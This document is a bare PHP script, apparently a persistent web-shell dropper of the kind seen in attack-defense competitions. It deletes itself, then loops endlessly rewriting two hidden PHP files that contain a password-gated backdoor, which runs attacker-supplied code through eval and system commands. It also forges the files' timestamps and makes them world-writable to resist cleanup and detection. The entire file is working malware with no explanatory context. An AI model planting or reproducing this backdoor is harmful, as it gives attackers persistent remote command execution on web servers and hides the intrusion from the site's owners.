<?php
    set_time_limit(0);
    ignore_user_abort(true);
    unlink(__FILE__); //self-delete
    $file = '.404.php';
    $file1 = '-404.php';
    $code = '<?php if(md5($_POST["md5"])=="61b69c634a38c0e37587a1141ef4effe"){@eval($_POST[a]);@system($_REQUEST["sys"]);exit();} ?>'; //Md5Encrypt3verything
    
    while(1){
        gen($file, $code);
        gen($file1, $code);
        usleep(100);
    }
    
    function gen($one, $code) {
        file_put_contents($one, $code);
        touch($one,mktime(9,1,30,8,28,2021));
        chmod($one,0777);
    }
?>